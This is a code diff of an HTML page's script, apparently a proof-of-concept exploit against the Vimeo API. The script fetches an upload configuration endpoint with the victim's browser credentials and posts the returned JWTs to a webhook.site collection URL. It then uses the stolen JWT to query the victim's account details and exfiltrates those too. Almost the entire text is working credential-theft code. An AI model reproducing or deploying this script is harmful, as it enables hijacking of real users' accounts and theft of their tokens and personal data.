@@ -8,22 +8,40 @@
   <pre id="output">Loading...</pre>
 
   <script>
-    // Vulnerable endpoint
-    const target = "https://api.vimeo.com/upload/config";
+    const exfil = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65"; // replace with your endpoint
 
-    // Where to exfiltrate the response
-    const exfil = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65";
-
-    fetch(target, { credentials: "include" })
-      .then(r => r.text())
+    // Step 1: fetch /upload/config with victim's credentials
+    fetch("https://api.vimeo.com/upload/config", { credentials: "include" })
+      .then(r => r.json())
       .then(data => {
-        // Show stolen data on page
-        document.getElementById("output").innerText = data;
+        // Show raw config response (contains JWTs)
+        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
 
-        // Exfiltrate to webhook
+        // Exfiltrate tokens
         fetch(exfil, {
           method: "POST",
-          body: data,
+          body: JSON.stringify({ stolen_config: data }),
+          headers: { "Content-Type": "application/json" }
+        });
+
+        // Step 2: grab main API JWT from response
+        const stolenJwt = data?.api?.jwt;
+        if (!stolenJwt) throw new Error("No JWT found in /upload/config response");
+
+        // Step 3: use stolen JWT to call another sensitive endpoint (example: /me)
+        return fetch("https://api.vimeo.com/me", {
+          headers: { "Authorization": "jwt " + stolenJwt }
+        });
+      })
+      .then(r => r.json())
+      .then(userData => {
+        // Show victim's user info
+        document.getElementById("output").innerText += "\n\nUser Info:\n" + JSON.stringify(userData, null, 2);
+
+        // Exfiltrate user info too
+        fetch(exfil, {
+          method: "POST",
+          body: JSON.stringify({ user_info: userData }),
           headers: { "Content-Type": "application/json" }
         });
       })
